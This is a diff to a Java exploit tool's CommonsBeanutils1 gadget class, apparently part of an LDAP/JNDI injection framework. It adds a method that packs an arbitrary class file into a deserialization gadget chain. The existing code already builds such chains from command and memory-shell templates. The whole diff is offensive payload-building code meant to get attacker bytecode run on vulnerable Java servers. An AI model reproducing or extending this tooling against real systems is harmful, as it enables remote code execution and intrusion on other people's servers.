@@ -3,6 +3,7 @@ package com.idiot9.ldap.gadgets;
 import com.idiot9.ldap.Starter;
 import com.idiot9.ldap.gadgets.utils.Reflections;
 import com.idiot9.ldap.gadgets.utils.TemplatesCreator;
+import com.idiot9.ldap.templates.ClassFileTemplates;
 import com.idiot9.ldap.templates.CommandTemplates;
 import com.idiot9.ldap.templates.TemplateFactory;
 import org.apache.commons.beanutils.BeanComparator;
@@ -29,6 +30,13 @@ public class CommonsBeanutils1 implements GadgetFactory{
         Constructor<?> constructor = memClass.getConstructor(String.class);
         TemplateFactory templateFactory = (TemplateFactory) constructor.newInstance(key);
         Templates templates = templateFactory.getTemplates();
+        return getGadget(templates);
+    }
+
+    @Override
+    public Object getClassFileObject(String classFile) throws Exception {
+        ClassFileTemplates classFileTemplates = new ClassFileTemplates(classFile);
+        Templates templates = classFileTemplates.getTemplates();
         return getGadget(templates);
     }
 
